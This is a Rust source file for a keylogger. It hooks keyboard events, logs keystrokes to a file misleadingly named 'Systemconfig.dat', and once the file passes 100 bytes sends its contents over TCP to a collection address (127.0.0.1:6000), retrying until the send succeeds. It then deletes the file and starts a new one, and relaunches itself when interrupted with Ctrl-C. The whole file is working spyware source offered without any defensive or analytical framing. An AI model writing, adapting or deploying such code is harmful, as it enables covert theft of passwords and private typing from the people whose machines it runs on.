mod windows;
use system32::Event;
use crate::windows::listen::listen;
use std::fs::{self ,OpenOptions};
use std::io::{ Read, Write};
use std::net:: TcpStream;
use std::process::{Command, Output};
use std::{env, process};
use std::thread;
use std::time::Duration;





fn netuploader(buf:Option<String>) {
    println!("thread started");
        match buf{
            Some( data)=>{
                loop {
                    match TcpStream::connect("127.0.0.1:6000") {
                        Ok(mut stream) => {
                            stream.write_all(data.as_bytes()).unwrap();
                            break;
                        }
                        Err(_) => {thread::sleep(Duration::from_secs(10));
                            continue;}
                    }
                    
                }
                   
            }
            None => {process::exit(0);}
        }
    }

fn relaunchself(){
    loop {
        let status = Command::new(env::current_exe().unwrap()).status().unwrap();
        if status.success(){
            break;
        }
    }
}

    
fn main() {
    
    let path = "Systemconfig.dat"; 
    let callback = move |event: Event| {
        match event.name {
            Some(mut string) => {
                println!("{:?}",string);
                string  = match string.as_str() {
                        "\u{1b}" => "<esc>".to_string(),
                        "\u{8}" | "\u{1a}" => "<backspace>".to_string(),
                        "\r" => "\n".to_string(),
                        e if e.chars().all(|a| a.is_alphanumeric()) =>  string,
                        e if e.chars().all(|a| a.is_ascii_punctuation()) =>  string,
                        " " => " ".to_string(),
                        _ => "".to_string()
                };
                let mut file  = OpenOptions::new().write(true).read(true).append(true).create(true).open(path).unwrap();
                if file.metadata().unwrap().len() > 100{
                    let mut buf = String::new();
                    file.read_to_string(&mut buf).unwrap();
                    thread::spawn(move || netuploader(Some((buf))) );
                    fs::remove_file(path).unwrap();
                    file =  OpenOptions::new().write(true).read(true).append(true).create(true).open(path).unwrap();
                    
                }
                file.write_all(string.as_bytes()).unwrap();

            }
            None => (),
        }
    };
 
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }
    ctrlc::set_handler(move || relaunchself()).unwrap() ;
    
   
}


